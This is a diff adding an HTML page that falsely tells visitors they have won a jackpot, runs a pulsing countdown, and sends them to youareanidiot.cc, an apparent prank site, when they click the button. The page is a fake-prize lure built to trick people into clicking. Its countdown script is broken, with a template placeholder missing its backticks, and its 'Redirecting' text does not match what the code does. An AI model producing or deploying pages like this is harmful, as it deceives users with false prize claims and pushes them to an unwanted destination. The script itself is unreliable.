@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Give You a Jackpot</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(45deg, #00bcd4, #ff6347, #ffeb3b);
+            background-size: 300% 300%;
+            animation: gradientAnimation 10s ease infinite;
+            color: #fff;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        @keyframes gradientAnimation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        h1 {
+            font-size: 4rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            animation: fadeIn 2s ease-out;
+        }
+
+        p {
+            font-size: 1.5rem;
+            margin-bottom: 40px;
+            animation: fadeIn 2s ease-out 1s;
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        button {
+            padding: 20px 40px;
+            background-color: #ff6347;
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.5rem;
+            cursor: pointer;
+            outline: none;
+            transition: transform 0.3s ease, background-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        button:hover {
+            transform: scale(1.2);
+            background-color: #ff4500;
+            box-shadow: 0 0 15px #ff6347, 0 0 30px #ff6347;
+        }
+
+        button:active {
+            transform: scale(1);
+        }
+
+        .countdown {
+            font-size: 2rem;
+            margin-top: 20px;
+            color: #ffeb3b;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            animation: float 5s infinite ease-in-out;
+        }
+
+        @keyframes float {
+            0% {
+                top: 0;
+                opacity: 0.8;
+            }
+            50% {
+                top: 50%;
+                opacity: 0.4;
+            }
+            100% {
+                top: 100%;
+                opacity: 0.8;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Congratulations! You've Won a Jackpot!</h1>
+        <p>Click the button below to claim your prize!</p>
+        <button onclick="startRedirect()">Click Me</button>
+        <div class="countdown" id="countdown"></div>
+    </div>
+
+    <script>
+        // Countdown Timer for dramatic effect
+        let countdownTime = 5;  // Countdown starts at 5 seconds
+        const countdownElement = document.getElementById('countdown');
+        const timer = setInterval(function() {
+            countdownElement.textContent = Redirecting in ${countdownTime}...;
+            countdownTime--;
+            if (countdownTime < 0) {
+                clearInterval(timer);
+                countdownElement.textContent = "Go ahead, click now!";
+            }
+        }, 1000);
+
+        // Create floating particles in the background
+        function createParticles() {
+            for (let i = 0; i < 10; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                particle.style.width = Math.random() * 5 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.left = Math.random() * window.innerWidth + 'px';
+                document.body.appendChild(particle);
+            }
+        }
+
+        // Redirect the user after the button click
+        function startRedirect() {
+            window.location.href = 'https://youareanidiot.cc';
+        }
+
+        createParticles();  // Call the function to generate particles
+    </script>
+</body>
+</html>
